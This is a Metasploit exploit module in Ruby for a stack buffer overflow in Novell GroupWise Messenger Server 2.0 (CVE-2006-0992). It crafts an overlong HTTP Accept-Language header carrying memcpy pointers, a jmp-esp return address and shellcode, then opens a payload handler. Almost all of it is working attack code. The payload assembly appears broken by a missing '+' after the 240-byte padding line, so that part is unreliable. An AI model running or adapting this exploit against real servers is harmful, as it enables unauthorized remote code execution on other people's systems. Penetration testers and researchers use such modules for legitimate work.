require 'msf/core'

module Msf

class Exploits::Windows::Http::NovellMessengerAcceptLanguage < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Novell Messenger Server 2.0 Accept-Language Overflow',
			'Description'    => %q{
					This module exploits a stack overflow in Novell GroupWise
				Messenger Server v2.0. This flaw is triggered by any HTTP
				request with an Accept-Language header greater than 16 bytes.
				To overwrite the return address on the stack, we must first
				pass a memcpy() operation that uses pointers we supply. Due to the
				large list of restricted characters and the limitations of the current
				encoder modules, very few payloads are usable. 	
			},
			'Author'         => [ 'H D Moore <hdm [at] metasploit.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
	  				['OSVDB', '24617'],
	  				['BID', '17503'],
					['CVE', '2006-0992'],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'           => 500, 
					'BadChars'        => 
						"\x00\x3a\x3b\x3c\x3d\x3e\x3f\x09\x0b\x0a\x0d\x20\x21\x22\x23\x24\x25\x26\x2c\x10"+
						[*("A".."Z")].join,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					['Groupwise Messenger DClient.dll v10510.37', { 'Rets' =>  [0x6103c3d3, 0x61041010] }],
				],
			'DisclosureDate' => 'Apr 13 2006'))
			
			register_options( [ Opt::RPORT(8300) ], self.class )
	end

	def exploit
		connect
		
		lang = 
			# Padding to reach the memcpy src pointer
			Rex::Text.rand_text_alphanumeric(16) +
			
			# The source pointer for the memcpy
			[target['Rets'][1]].pack('V') + 
			
			# Padding to reach the stack return address
			Rex::Text.rand_text_alphanumeric(240)
			
			# The return address (a jmp esp)
			[target['Rets'][0]].pack('V') + 
			
			# Jump over the next 6 bytes to payload
			"\xeb\x06" + 
			
			# Padding to reach the memcpy dst pointer
			Rex::Text.rand_text_alphanumeric(2) +
			
			# The destination pointer for the memcpy
			[target['Rets'][1]].pack('V') + 
			
			# The actual payload
			payload.encoded +
			
			# Padding to keep the request aligned in memory
			Rex::Text.rand_text_alphanumeric(1500-payload.encoded.length)
			 

		res = "GET / HTTP/1.1\r\nAccept-Language: #{lang}\r\n\r\n"
		
		print_status("Trying target address 0x%.8x..." % target['Rets'][0])
		sock.put(res)
		sock.close
		
		handler
		disconnect
	end

end
end	
